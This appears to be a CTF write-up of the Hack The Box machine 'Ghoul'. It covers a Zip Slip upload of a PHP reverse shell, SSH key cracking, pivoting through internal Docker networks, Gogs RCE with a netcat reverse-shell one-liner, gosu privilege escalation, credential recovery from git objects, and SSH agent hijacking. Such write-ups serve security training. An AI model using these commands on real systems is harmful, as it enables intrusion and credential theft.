Due to the fact that there doesn't seems to be nothing really interesting on the website on port 80 and that the one on port 8080 is protected from a basic authentication, I run gobuster on port 80.

<pre> /root/go/bin/gobuster dir -u http://10.10.10.101/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -o gobuster --timeout 30s

/less (Status: 301)

</pre>

This reveals an interesting page, secret.php.
It shows a chat between system admins  talking about an RCE on the current infrastructure.

![](/images/Ghoul/secret_1.png)

Due to the fact that the enumeration didn't show anything else interesting here I swapped port and went to port 8080. I then tried **admin:admin** and it worked, revealing a website for uploading images or zip files on the server.

![](/images/Ghoul/zip_2.png)

After a few tests in which I verified that it is not possible to easily evade the file-type filters of the upload form I searched a bit on google and I found the Ziplib vulnerability (https://github.com/snyk/zip-slip-vulnerability). This vulnerability allows to write arbitrary files because the zip archives contains directory traversal filenames.

The main Idea is then to being able to upload a php reverse shell on the webserver using this vulnerability. I took then the reverse.php from kali and created a set of folders with depth 5 - just to being sure to reach the / folder of the target system- in order to run the following command:

<pre>
zip ziplib_www.zip ../../../../../var/www/html/rev.php
</pre>

![](/images/Ghoul/zip_slip_3.png)

Once uploaded the ziplib_www.zip file using the upload form, connecting to http://10.10.10.101:80/rev.php returns a reverse shell on our netcat listener.

![](/images/Ghoul/rev_4.png)

Enumerating the box, I noticed that there are three users with a login: eto,kaneki and noro.
LinEnum.sh shows up interesting backup files under the folder /var/backups . After having downloaded the whole directory using a meterpreter session and figured out that most of the files are rabbit holes I focused only on the directory /var/backups/backups/keys, which contains three old ssh private keys of the three users.
Unfortunately all these keys are encrypted so I had to find a way to decrypt those. I tried then to use JTR , converting the ssh keys using ssh2john script:

<pre> python /root/Documents/cryptography/JohnTheRipper/run/ssh2john.py kaneki.backup </pre>

After multiple failures using rockyou for cracking the three of them, I decided to use cewl on the secret.php page in order to create an alternative wordlist.

<pre>cewl http://10.10.10.101/secret.php > cewl.txt</pre>

And finally I got it cracked!

![](/images/Ghoul/ssh_pswd_5.png)


The ssh decryption password for kaneki ssh is **ILoveTouka** and I am finally able to login as kaneki. 
Got user !

# ROOT

The first thing to notice are two notes present into the home folder of kaneki:

<pre>note.txt :Vulnerability in Gogs was detected. I shutdown the registration function on our server, please ensure that no one gets access to the test accounts

notes : I've set up file server into the server's network ,Eto if you need to transfer files to the server can use my pc. DM me for the access.</pre>

These are interesting because they make me understand two things:  first , there is another vulnerability to exploit around, probably usefull for privesc, and second, that we are into a virtualized network, specifically a Docker container - we can notice the file .dockerenv in the / folder.

Indeed, looking at ifconfig:

![](/images/Ghoul/ifconfig_6.png)

So apparently there is an internal network 172.20.0.0/24 and we need to explore it.
Indeed, after uploading nmap and having run:

<pre>nmap -p-  172.20.0.0-255

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-05 14:40 UTC

Enumerating more the whole FileSystem and searching for tomcat configuration files, which could contain interesting credentials, I found the following file:
/usr/share/tomcat7/conf/tomcat-users.xml which contains a commented line :

<pre> user username="admin" password="test@aogiri123" roles="admin" </pre>

Maybe it would be usefull later on.
So it is clear that we have a new host in the network. Reading inside the .ssh folder of kaneki user I noticed a new ID of the current user:

<pre>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhK6T0d7TXpXNf2anZ/02E0NRVKuSWVslhHaJjUYtdtBVxCJg+wv1oFGPij9hgefdmFIKbvjElSr+rMrQpfCn6v7GmaP2QOjaoGPPX0EUPn9swnReRgi7xSKvHzru/ESc9AVIQIaeTypLNT/FmNuyr8P+gFLIq6tpS5eUjMHFyd68SW2shb7GWDM73tOAbTUZnBv+z1fAXv7yg2BVl6rkknHSmyV0kQJw5nQUTm4eKq2AIYTMB76EcHc01FZo9vsebBnD0EW4lejtSI/SRC+YCqqY+L9TZ4cunyYKNOuAJnDXncvQI8zpE+c50k3UGIatnS5f2MyNVn1l1bYDFQgYl <b>kaneki_pub@kaneki-pc</b>

Acknoweldging that we are currently into the Aogiri host, guess drives me to say that probably 172.20.0.150 is kaneki-pc. 
I tried then to use the current private ssh key present into the ssh folder of kaneki to connect to the remote host:

<pre>kaneki@Aogiri:~/.ssh$ ssh -i id_rsa kaneki_pub@172.20.0.150</pre>

Using the same password as before .. and it worked, I am in!
I noticed then another text file:

<pre>to-do.txt : Give AogiriTest user access to Eto for git.</pre>

This means that there is a git repo somewhere on one of these hosts, which could contain interesting info. Moreover, looking at ifconfig, I noticed that this box is connected to a new subnet,172.18.0.0/24:

![](/images/Ghoul/ifconfig_7.png)

In order to upload nmap also on this box, I used an ssh tunneling:

<pre>ssh -L 9000:172.20.0.150:22 -i ./Backups/kaneki.backup  kaneki@10.10.10.101
scp -P9000 -i id_rsa ./nmap kaneki_pub@127.0.0.1:/tmp</pre>

And in this way I have been able to successfully upload nmap to kaneki-pc ( 172.20.0.150 ).

<pre>kaneki_pub@kaneki-pc:/tmp$ ./nmap -p- 172.18.0.0-255

</pre>

As it is possible to observer, there is a new host ,172.18.0.2, with ssh and http open on port 3000. In order to check what  is present on that server, I had to tunnel again over ssh, using this time the existing tunnel already present.

<pre>ssh -L 9100:172.18.0.2:3000 -i id_rsa  kaneki_pub@localhost -p 9000 </pre>

And we can see a login screen of Gogs.

![](/images/Ghoul/web_8.png)

After enormous time spent bruteforcing the credentials I just tried to use all users and passwords already found on the box and I finally found the right combination.

**AogiriTest:test@aogiri123**

![](/images/Ghoul/gogs_9.png)

From a previous note we know there is a vulnerability on gogs so google is our best friend here..
And I found this coll github repo with Poc : https://github.com/TheZ3ro/gogsownz.
So mainly we are able to obtain a RCE on gogs. Let's try to obtain a reverse shell!

After having uploaded netcat through scp :

<pre> scp -P9000 -i id_rsa ./ncat kaneki_pub@127.0.0.1:/tmp</pre>

and having started a local listener we run the following command:

<pre>python3 gogsownz.py http://127.0.0.1:9100/ -C 'AogiriTest:test@aogiri123' --rce 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.18.0.200 8000 >/tmp/f'  --cleanup</pre>

And I am git on 172.18.0.2!

![](/images/Ghoul/root_9.png)

Enumerating the system I noticed that there is only one user except root, which git, which seems mandatory for Gogs. This seems pointless so go on with enumeration!
Let's try with classical Linux enumeration files using  https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
Running enumeration for SUID binaries we see something interesting:

<pre>/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chage
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/expiry
<b>/usr/sbin/gosu</b>
/bin/su</pre>

![](/images/Ghoul/gosu_10.png)

So just running:

<pre>gosu root bash</pre>

allows to become root.

 Going into the /root folder I can see interesting information:

 ![](/images/Ghoul/root_12.png)

So we have new credentials :

**kaneki:12345ILoveTouka!!!**

I tried to log in into Gogs with those but there is only a gogstest report, totally empty and useless. Lets focus on the other file: **aogiri-app.7z**
After having downloaded it locally:

<pre>chmod 777 aogiri-app.7z
cp aogiri-app.7z /tmp
ncat -l -p 1234 -q 1 > aogiri-app.7z< /dev/null → on 172.18.0.200
cat aogiri-app.7z | nc 172.18.0.200 1234 → on 172.18.0.2
scp -P9000 -i id_rsa kaneki_pub@127.0.0.1:/tmp/aogiri-app.7z  ./aogiri-app.7z </pre>

I started looking at it closely. It is a git repository. Really interesting.
It seems that initially I found some creds but unfortunately useless :(

<pre>/src/main/resources# cat application.properties 
server.port=8080
spring.datasource.url=jdbc:mysql://172.18.0.1:3306/db
spring.datasource.username=kaneki
spring.datasource.password=jT7Hr$.[nF.)c)4C
server.address=0.0.0.0

spring.jpa.properties.hibernate.dialect = org.hibernate.dialect.MySQL5InnoDBDialect
spring.jpa.hibernate.ddl-auto = validate

spring.servlet.multipart.enabled=true
spring.servlet.multipart.file-size-threshold=2KB
spring.servlet.multipart.max-file-size=200MB
spring.servlet.multipart.max-request-size=215MB</pre>

As first we can look at it using common git commands, as log, show,branch etc.. but those are rabbit holes. Indeed, looking at the git logs we can see that there  is a remote git repository !

Looking at the configurations, this remote has been hosted by gogs , probably a while ago and we cannot access it anymore. The only hope is that some crucial information has been stored into git objects.
Git objects can be found under .git/objects folder and they are zlib files. Luckily for us, stackoverflow will help ! https://stackoverflow.com/questions/3178566/how-to-deflate-with-a-command-line-tool-to-extract-a-git-object

<pre>printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" | cat - .git/objects/c0/fb67ab3fda7909000da003f4b2ce50a53f43e7 | gunzip → this works!</pre>

So start trying all the the git objects one by one, taking note for eventual new password appearing, suddenly I got something...

<pre>
    /.git/objects/41# printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" | cat - * | gunzip | strings

gzip: stdin: unexpected end of file
blob 476
server.port=8080
spring.datasource.url=jdbc:mysql://localhost:3306/db
spring.datasource.username=root
spring.datasource.password=g_xEN$ZuWD7hJf2G
</pre>

Tried the new password everywhere... Nein!

<pre>gzip: stdin: unexpected end of file
blob 478
server.port=8080
spring.datasource.url=jdbc:mysql://localhost:3306/db
spring.datasource.username=kaneki
spring.datasource.password=7^Grc%C\7xEQ?tb4
server.address=0.0.0.0</pre>

And the new password... works! We are able to become root on 172.20.0.150

<pre>su : pasword 7^Grc%C\7xEQ?tb4</pre>

Ok so we are root on the 172.18.0.200, the only host that is still untouched is the docker server on 172.20.0.1. Maybe on the filesystem there are some info for connect to it.
Run enumeration, nothing.
Lets try conjobs, just run pspy64 and wait a while.
And finally something weird happened:

It seems that some other host is passing through this host to reach 172.18.0.1 for a root session on it...interesting
After a bit of googling I got my answer:

So I can Hijack the SSH session. I just need to be fast.

<pre>SSH_AUTH_SOCK=/tmp/ssh-e6wtZlMHTY/agent.1061 ssh root@172.18.0.1 -p 2222</pre>
 
finally root...
